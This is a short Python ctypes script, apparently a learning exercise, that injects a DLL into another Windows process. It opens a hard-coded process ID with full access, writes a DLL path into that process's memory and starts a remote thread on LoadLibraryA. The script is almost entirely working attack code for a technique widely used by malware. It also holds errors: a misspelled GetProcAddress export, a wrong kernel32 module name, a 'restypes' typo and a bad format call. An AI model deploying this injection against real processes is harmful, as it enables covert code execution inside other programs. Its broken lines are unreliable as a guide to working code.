#1. allocate memory in remote Process
#2. write a dll location in to that memory
#3. have a external process to load that dll using load library


from ctypes import *
from ctypes import wintypes

kernell32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t


OpenProcess = kernell32.OpenProcess
OpenProcess. argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernell32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD,wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WritePrcessMemory = kernell32.WriteProcessMemory
WritePrcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID, SIZE_T, POINTER(SIZE_T))
WritePrcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernell32.GetModuleHandle
GetModuleHandle. argtypes = (LPCTSTR,)
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernell32.GetPocAddress
GetProcAddress.argtypes = (wintypes.HANDLE, LPCTSTR)
GetProcAddress.restypes = (wintypes.LPVOID)

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength',wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernell32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE,LPSECURITY_ATTRIBUTES, SIZE_T,LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0X00001000
MEM_RESERVE = 0X00002000
PAGE_READWRITE = 0X04
EXECUTE_IMMEDIATELY = 0X0 
PROCESS_ALL_ACCESS = (0X000F0000 | 0x00100000 | 0x00000FFF)

dll = b"/home/Remote DLL injection/hello_world.dll"

pid = 2016

handle = OpenProcess(PROCESS_ALL_ACCESS, False,pid)

if not handle:
    raise WinError()

print("Handle obtained => {0:X}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE)

if not remote_memory:
    raise WinError()

print("Memory allocated => ", hex(remote_memory))

write = WritePrcessMemory(handle, remote_memory, dll, len(dll) + 1,None)
if not write:
    raise WinError()

print("Bytes written => {0:X}".format(dll))

load_lib = GetProcAddress(GetModuleHandle(b"kernell32.dll"), b"LoadLibraryA")
print("LoadLibrary Address => ", hex(load_lib))

rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)

